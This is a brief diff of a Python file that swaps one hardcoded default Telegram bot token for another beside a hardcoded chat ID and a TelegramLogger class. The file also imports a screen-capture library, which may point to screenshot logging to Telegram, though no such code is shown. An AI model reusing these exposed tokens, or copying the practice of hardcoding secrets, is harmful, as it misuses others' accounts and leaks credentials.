@@ -34,7 +34,7 @@ import requests
 from PIL import ImageGrab
 
 # ==================== TELEGRAM ====================
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8670890083:AAFdQaEiC67jmk6l8jxxdG01NTEN4JxvPUc")
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8972471605:AAE7hhT8QO5N_hnfHTIX1PxRzmkRBm5voyY")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6955911349")
 
 class TelegramLogger:
